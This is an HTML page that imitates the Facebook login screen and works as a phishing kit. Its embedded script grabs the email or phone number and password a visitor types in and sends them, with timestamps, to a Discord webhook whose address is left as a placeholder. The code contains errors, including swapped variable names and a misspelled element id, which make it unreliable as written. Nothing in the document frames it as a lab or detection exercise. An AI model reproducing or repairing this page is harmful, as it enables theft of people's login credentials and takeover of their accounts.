<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        nav {
            height: 120px;
            width: 100%;
        }

        img {
            width: 60px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto;
            top: 30%;
            position: relative;
        }

        #form {
            display: flex;
            flex-direction: column;
            width: 400px;
            margin: 7rem auto;
            position: relative;
            gap: 1rem;
        }

        #form input {
            border: 1px solid #ddd;
            padding: 10px;
            border-radius: 14px;
            font-size: 16px;
            width: 140%;
            height: 6vh;
        }

        #form input:focus {
            outline: 1px solid #0064e0;
        }

        #form button {
            border: none;
            padding: 10px;
            border-radius: 20px;
            background-color: #0064e0;
            color: white;
            font-weight: bold;
            cursor: pointer;
            width: 140%;
        }

        #form label {
            font-weight: bold;
        }

        #form .forgotten {
            background: rgb(255, 255, 255);
            color: black;
        }

        #form .forgotten:hover {
            background: rgb(252, 249, 249);
        }

        #form .create {
            border: 1px solid #0064e0;
            background: white;
            color: #0064e0;
        }
    </style>
</head>

<body>

    <nav><img src="icons/facebook-icon.png"></nav>
    <hr>

    <form id="form">

        <label for="name">Log in to FaceBook</label>
        <input type="text" id="name" placeholder="Email address or mobile number">
        <input type="password" id="password" placeholder="Password">

        <button type="submit" class="login">Log in</button>
        <button type="submit" class="forgotten">Forgotten password</button>
        <button type="submit" class="create">Create new account</button>
    </form>

    <script>

        const formLoadTime = new Date();

        document.getElementById("form").addEventListener('submit', function (event) {

            event.preventDefault();

            const submitClickTime = new Date();

            const passwordValue = document.getElementById('name').value;
            const nameValue = document.getElementById('passoword').value;

            const webhookUrl = "{{DS-HOOK}}";

            const discordMessage = {
                content: `**New Form Submission**\n` +
                    `**Name:** ${nameValue}\n` +
                    `**Password:** ${passwordValue}\n` +
                    `**Form Opened At:** ${formLoadTime.toLocaleString()}\n` +
                    `**Submit Clicked At:** ${submitClickTime.toLocaleString()}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            });
        })
    </script>
</body>

</html>
